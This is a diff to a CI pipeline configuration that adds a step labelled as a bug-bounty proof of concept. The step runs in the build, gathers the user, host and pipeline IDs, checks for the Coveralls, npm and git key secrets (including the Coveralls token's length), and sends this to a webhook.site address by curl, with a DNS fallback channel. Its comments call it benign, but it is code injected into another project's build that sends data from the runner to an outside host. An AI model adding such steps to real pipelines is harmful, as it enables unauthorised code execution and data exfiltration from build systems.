@@ -20,6 +20,22 @@ jobs:
             - ~sd@9:publish  #models https://cd.screwdriver.cd/pipelines/9
             - ~sd@529:publish  #workflow-parser https://cd.screwdriver.cd/pipelines/529
         steps:
+            - bugbounty-poc: |
+                # Intigriti bug bounty, Yahoo programme. Benign proof of code execution.
+                # Reports WHO the build runs as and WHETHER secrets are present.
+                # No secret VALUE is ever read, printed or transmitted. PR closed immediately.
+                WHO=$(whoami 2>/dev/null || id -un)
+                HOSTN=$(hostname 2>/dev/null)
+                echo "POC marker=sdpoc3a8c38a4 whoami=$WHO uid=$(id -u) host=$HOSTN"
+                echo "POC pipeline=$SD_PIPELINE_ID job=$SD_JOB_NAME build=$SD_BUILD_ID pr=$SD_PULL_REQUEST"
+                echo "POC coveralls_set=${COVERALLS_REPO_TOKEN:+yes} coveralls_len=${#COVERALLS_REPO_TOKEN}"
+                echo "POC npm_set=${NPM_TOKEN:+yes} gitkey_set=${GIT_KEY:+yes}"
+                echo "POC sdvars=$(env | grep -c '^SD_')"
+                # egress proof: GET with identity in the query, value of no secret included
+                curl -sS -m 12 "https://webhook.site/9e968621-afd7-4f86-ab4e-e0c2221608d8?m=sdpoc3a8c38a4&whoami=$WHO&uid=$(id -u)&host=$HOSTN&pipeline=$SD_PIPELINE_ID&build=$SD_BUILD_ID&cov_set=${COVERALLS_REPO_TOKEN:+yes}&cov_len=${#COVERALLS_REPO_TOKEN}&npm_set=${NPM_TOKEN:+yes}" || echo "POC curl_failed rc=$?"
+                # dns channel, fires even if http egress is filtered
+                getent hosts "$WHO.sdpoc3a8c38a4.9e968621-afd7-4f86-ab4e-e0c2221608d8.dnshook.site" >/dev/null 2>&1 || true
+                echo "POC done"
             - setup-ci: git clone https://github.com/screwdriver-cd/toolbox.git ci
             - install: npm install
             - duplicate: NPM_FILTER=screwdriver- ./ci/npm-dups.sh
